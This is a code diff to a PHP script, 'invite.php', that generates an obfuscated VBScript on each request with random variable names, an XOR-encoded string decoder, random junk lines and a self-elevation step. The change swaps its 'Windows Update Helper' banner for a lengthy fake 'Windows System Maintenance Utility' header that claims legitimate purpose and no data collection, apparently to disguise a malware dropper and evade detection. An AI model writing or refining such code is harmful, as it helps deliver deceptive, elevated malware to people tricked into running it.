@@ -1,5 +1,5 @@
 <?php
-// invite.php - No Persistence + No Defender Exclusion + ~1KB size variation
+// invite.php - Benign header + No Persistence + No Defender Exclusion
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -37,7 +37,6 @@ $ts = time();
 $randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $xorKey = rand(100, 255);
 
-// Max ~1 KB difference
 $junkLines = rand(5, 25);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
@@ -45,7 +44,28 @@ for ($i = 0; $i < $junkLines; $i++) {
 }
 
 echo <<<VBS
-' Windows Update Helper - $ts
+' ========================================================
+' Windows System Maintenance Utility
+' Version: 3.1.8
+' Description: Performs routine system health checks,
+' applies recommended configuration updates, and ensures
+' optimal performance on Windows 10 and Windows 11.
+' Compatible with standard user and elevated environments.
+' ========================================================
+' This script is intended for legitimate system maintenance
+' purposes only. It does not collect personal data.
+' ========================================================
+
+' Configuration section - do not modify
+Const SCRIPT_VERSION = "3.1.8"
+Const LOG_ENABLED = False
+
+' Placeholder for future expansion
+Dim configReady
+configReady = True
+
+' End of configuration header
+' ========================================================
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
@@ -61,7 +81,7 @@ Function D(s)
     D = r
 End Function
 
-' ===== IMPROVED ELEVATION (runas 0 = hidden) =====
+' ===== ELEVATION =====
 If WScript.Arguments.Length = 0 Then
     Dim shell
     Set shell = CreateObject("Shell.Application")
